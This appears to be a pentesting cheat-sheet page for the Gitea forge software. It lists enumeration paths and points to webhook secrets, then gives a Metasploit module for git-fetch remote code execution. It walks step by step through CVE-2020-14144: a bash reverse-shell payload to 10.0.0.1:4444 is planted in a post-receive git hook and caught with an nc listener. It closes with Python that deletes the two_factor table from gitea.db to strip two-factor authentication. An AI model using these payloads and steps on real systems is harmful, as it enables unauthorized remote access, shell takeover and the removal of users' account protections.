---
title: Gitea Pentesting
description: Gitea is a forge software package for hosting software development version control using Git.
tags:
    - Web
refs:
date: 2023-03-16
draft: false
---

## Common Directories

```bash
/api/swagger
/explore/organizations
/explore/repos
/explore/users
```

<br />

## Investigation

### Get Secrets in Web Hooks

In the existing repository, we may find the secret value in the **repository → Settings → Web Hooks**.

<br />


## Git Fetch Remote Code Execution (RCE)

### Metasploit

```bash
msfconsole
msf> use exploit/multi/http/gitea_git_fetch_rce
msf> (set options)
msf> run
```

<br />

## Git Hooks Remote Code Execution (RCE)

It is [CVE-2020-14144](https://github.com/p0dalirius/CVE-2020-14144-GiTea-git-hooks-rce) .

### 1. Login

Access to the Gitea dashboard and login as the existing account.

### 2. Create a New Repository

### 3. Go to the Repository’s Settings

In the new repository we’ve created, go to **Settings → Git Hooks → post-receive**.

### 4. Update to the Reverse Shell Payload

In the post-receive edit page, inject the payload as below:

```bash
#!/bin/bash

bash -i >& /dev/tcp/10.0.0.1/4444
```

### 5. Start Listener in Terminal

To receive the outcoming connection of the git hook, start listener.

```bash
nc -lvnp 4444
```

### 6. Create the New Repository in Terminal

```bash
mkdir test
cd test
touch README.md
git init
git add README.md
git commit -m "first commit"
git remote add origin https://<target-ip>/<username>/test.git
git push -u origin master
```

After pushing, git hook triggered and execute the reverse shell command.  
Now we should get a shell.

<br />

## Delete the Two-Factor

```sh
victim@machine:/gitea/gitea$ python3

>>> import sqlite3
>>> conn=sqlite3.connect('gitea.db')
>>> conn.execute('delete from two_factor')
>>> conn.commit()
>>> conn.close()
```
